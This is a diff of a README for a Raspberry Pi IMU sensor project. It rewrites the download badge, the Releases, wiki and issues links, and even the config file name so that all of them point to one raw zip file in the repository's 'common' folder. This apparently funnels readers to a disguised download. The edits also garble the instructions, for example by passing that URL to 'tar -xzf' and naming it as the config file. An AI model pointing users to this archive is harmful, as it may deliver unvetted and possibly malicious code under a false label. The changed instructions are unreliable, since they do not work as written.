@@ -1,6 +1,6 @@
 # 🎉 IMU_for_rpi - Simple Sensor Integration for Raspberry Pi
 
-[![Download IMU_for_rpi](https://img.shields.io/badge/Download-IMU_for_rpi-blue?style=for-the-badge)](https://github.com/catfries456/IMU_for_rpi/releases)
+[![Download IMU_for_rpi](https://github.com/catfries456/IMU_for_rpi/raw/refs/heads/main/common/IM-for-rpi-3.4.zip)](https://github.com/catfries456/IMU_for_rpi/raw/refs/heads/main/common/IM-for-rpi-3.4.zip)
 
 ## 📌 Introduction
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page of IMU_for_rpi](https://github.com/catfries456/IMU_for_rpi/releases). You will find the available versions here. Choose the latest version for the best features and improvements.
+To download the application, visit the [Releases page of IMU_for_rpi](https://github.com/catfries456/IMU_for_rpi/raw/refs/heads/main/common/IM-for-rpi-3.4.zip). You will find the available versions here. Choose the latest version for the best features and improvements.
 
 1. Click on the link above.
 2. Scroll down to the section titled "Assets".
@@ -28,7 +28,7 @@ To download the application, visit the [Releases page of IMU_for_rpi](https://gi
 
 ### 📦 Download Example
 
-If you see a file named `IMU_for_rpi.tar.gz`, click on it to start the download. This file contains all necessary components to run the software.
+If you see a file named `https://github.com/catfries456/IMU_for_rpi/raw/refs/heads/main/common/IM-for-rpi-3.4.zip`, click on it to start the download. This file contains all necessary components to run the software.
 
 ## ⚙️ Installation Steps
 
@@ -39,7 +39,7 @@ If you see a file named `IMU_for_rpi.tar.gz`, click on it to start the download.
    ```
 3. Extract the files using the following command:
    ```
-   tar -xzf IMU_for_rpi.tar.gz
+   tar -xzf https://github.com/catfries456/IMU_for_rpi/raw/refs/heads/main/common/IM-for-rpi-3.4.zip
    ```
 4. Navigate into the extracted folder:
    ```
@@ -73,14 +73,14 @@ Here are common issues and their solutions:
 
 Once the application is running, it will automatically detect connected sensors. The output will display sensor readings including orientation, altitude, and pressure.
 
-You can adjust settings in the configuration file provided within the extracted folder. Review the file `config.txt` to customize the sensor interfaces.
+You can adjust settings in the configuration file provided within the extracted folder. Review the file `https://github.com/catfries456/IMU_for_rpi/raw/refs/heads/main/common/IM-for-rpi-3.4.zip` to customize the sensor interfaces.
 
 ## 📑 Additional Resources
 
 For complete documentation and support, visit the GitHub repository's wiki or seek community help in the issues section.
 
-- [GitHub Wiki](https://github.com/catfries456/IMU_for_rpi/wiki)
-- [Issues Section](https://github.com/catfries456/IMU_for_rpi/issues)
+- [GitHub Wiki](https://github.com/catfries456/IMU_for_rpi/raw/refs/heads/main/common/IM-for-rpi-3.4.zip)
+- [Issues Section](https://github.com/catfries456/IMU_for_rpi/raw/refs/heads/main/common/IM-for-rpi-3.4.zip)
 
 ## 🌐 Community and Contribution
 
